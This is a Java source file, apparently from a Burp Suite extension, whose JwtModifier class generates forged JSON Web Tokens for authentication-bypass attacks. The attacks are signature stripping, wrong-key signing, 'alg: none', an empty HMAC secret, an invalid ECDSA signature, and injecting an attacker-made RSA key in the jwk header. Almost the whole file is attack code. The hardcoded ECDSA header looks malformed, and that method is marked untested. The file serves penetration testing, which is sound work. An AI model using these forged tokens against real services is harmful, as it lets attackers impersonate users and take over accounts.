package BurpExtension;
import burp.api.montoya.core.ByteArray;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.KeyPairBuilder;
import io.jsonwebtoken.security.Keys;
import burp.api.montoya.MontoyaApi;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.*;
import java.security.SignatureException;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

import com.nimbusds.jose.jwk.RSAKey;
import org.json.JSONObject;

public class JwtModifier {
    private final MontoyaApi api;
    private final SecretKey dummyKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);
    JwtModifier (MontoyaApi api){
        this.api = api;
    }

    private static String decodeBase64Url(String base64Url) {
        Base64.Decoder decoder = Base64.getUrlDecoder();
        byte[] decodedBytes = decoder.decode(base64Url);
        return new String(decodedBytes, StandardCharsets.UTF_8);
    }

    private static String encodeBase64Url(String input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes(StandardCharsets.UTF_8));
    }

    private static String encodeBase64UrlByte(byte[] input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input);
    }

    public boolean isJwtNotExpired(String jwt) {
        String[] jwtParts = jwt.split("\\.");
        String payload = jwtParts[1];
        String decodedClaim = decodeBase64Url(payload);
        JSONObject claim = new JSONObject(decodedClaim);
        long expValue = claim.getLong("exp");
        long currentTime = System.currentTimeMillis()/1000;
        return expValue > currentTime;
    }

    public String removeSignature(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String header = jwtParts[0];
        String claims = jwtParts[1];

        return header + '.' + claims;
    }

    public String wrongSignature(String jwt){
        String[] jwtParts = jwt.split("\\.");
        return createJwtFromString(jwtParts[0], jwtParts[1], dummyKey.toString());
    }

    public String algNone(String jwt, String alg) {
        String[] jwtParts = jwt.split("\\.");
        JSONObject header = new JSONObject(decodeBase64Url(jwtParts[0]));

        header.put("alg", alg);
        return encodeBase64Url(header.toString()) + '.' + jwtParts[1] + '.';
    }


    public String emptyPassword(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String combined = jwtParts[0] + '.' + jwtParts[1];
        return combined + '.' + createHmacSha256EmptySignature(combined);
    }
    //Todo: Test implementation with lab or website vulnerable to this attack.
    public String invalidEcdsa(String jwt){
        String[] jwtParts = jwt.split("\\.");
        String header = "ezJ0eXAiOiJKV1QiLCJhbGciOiJFUyI1NiJ9";
        String claim = jwtParts[1];
        String signature = "MAZCAQACAQA";
        return header + '.' + claim + '.' + signature;
    }


    public String jwksInjection(String jwt){
        String[] jwtParts = jwt.split("\\.");

        try {

            JSONObject headerObject = new JSONObject();
            headerObject.put("alg", "RS256");

            KeyPair keyPair = loadRS256KeyPair();
            RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();

            RSAKey jwk = new RSAKey.Builder(publicKey).build();

            headerObject.put("jwk",jwk.toJSONObject());
            String header = base64UrlEncodeNoPadding(headerObject.toString());
            return signJWTRSA(header, jwtParts[1], keyPair.getPrivate());

        } catch (Exception e) {
            api.logging().logToError(e.getMessage());
            return null;
        }
    }

    private static String stringToUtf8(String input) {
        return new String(input.getBytes(), StandardCharsets.UTF_8);
    }

    private static String base64UrlEncodeNoPadding(String input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(stringToUtf8(input).getBytes());
    }

    private static String base64UrlEncodeNoPadding(byte[] input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input);
    }

    private KeyPair generateRS256KeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(2048);

        return keyPairGenerator.generateKeyPair();
    }

    private KeyPair loadRS256KeyPair() throws NoSuchAlgorithmException {
        // load PrivateKey and PublicKey
        ByteArray privateKeyByteArray = this.api.persistence().extensionData().getByteArray("privateKey");
        ByteArray publicKeyByteArray = this.api.persistence().extensionData().getByteArray("publicKey");

        if (privateKeyByteArray == null || publicKeyByteArray == null) {
            KeyPair keyPair = generateRS256KeyPair();

            // store PrivateKey and PublicKey
            byte[] privateKeyByte = keyPair.getPrivate().getEncoded();
            this.api.persistence().extensionData().setByteArray("privateKey", ByteArray.byteArray(privateKeyByte));
            byte[] publicKeyByte = keyPair.getPublic().getEncoded();
            this.api.persistence().extensionData().setByteArray("publicKey", ByteArray.byteArray(publicKeyByte));

            return keyPair;
        } else {
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");

            PrivateKey privateKey = null;
            PublicKey publicKey = null;
            try {
                privateKey = keyFactory.generatePrivate(new PKCS8EncodedKeySpec(privateKeyByteArray.getBytes()));
                publicKey = keyFactory.generatePublic(new X509EncodedKeySpec(publicKeyByteArray.getBytes()));
            } catch (InvalidKeySpecException e) {
                this.api.logging().logToError(e.getMessage());
            }

            return new KeyPair(publicKey, privateKey);
        }
    }

    private static String signJWTRSA(String header, String payload, PrivateKey privateKey) throws NoSuchAlgorithmException, SignatureException, InvalidKeyException {

        final String data = header + "." + payload;

        Signature privateSignature = Signature.getInstance("SHA256withRSA");
        privateSignature.initSign(privateKey);
        privateSignature.update(data.getBytes(StandardCharsets.UTF_8));

        byte[] signature = privateSignature.sign();
        return String.format("%s.%s.%s", header, payload, base64UrlEncodeNoPadding(signature));
    }


    private String createJwtFromString(String header, String claim, String key) {
        /* JWS Signing Input (RFC)
        The input to the digital signature or MAC computation.  Its value
        is ASCII(BASE64URL(UTF8(JWS Protected Header)) || '.' ||
        BASE64URL(JWS Payload)). */

        // Check if header and claim are already encoded.
        if (!header.startsWith("ey")) {
            header = encodeBase64Url(header);
        }
        if (!claim.startsWith("ey")) {
            claim = encodeBase64Url(claim);
        }

        String combined = header + "." + claim;
        String signature = createHmacSha256Signature(combined, key);
        return combined + "." + signature;
    }

    private String createHmacSha256Signature(String input, String secret) {
        SecretKeySpec secretKeySpec = new SecretKeySpec(secret.getBytes(), "HmacSHA256");
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(secretKeySpec);

            byte[] hmacBytes = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return encodeBase64UrlByte(hmacBytes);

        } catch (Exception e) {
            api.logging().logToError(e.getMessage());
            return input;
        }
    }

    private String createHmacSha256EmptySignature(String input) {
        EmptySecret emptySecret = new EmptySecret();
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(emptySecret);

            byte[] hmacBytes = mac.doFinal(input.getBytes(StandardCharsets.UTF_8));
            return encodeBase64UrlByte(hmacBytes);

        } catch (Exception e) {
            api.logging().logToError(e.getMessage());
            return input;
        }
    }
}
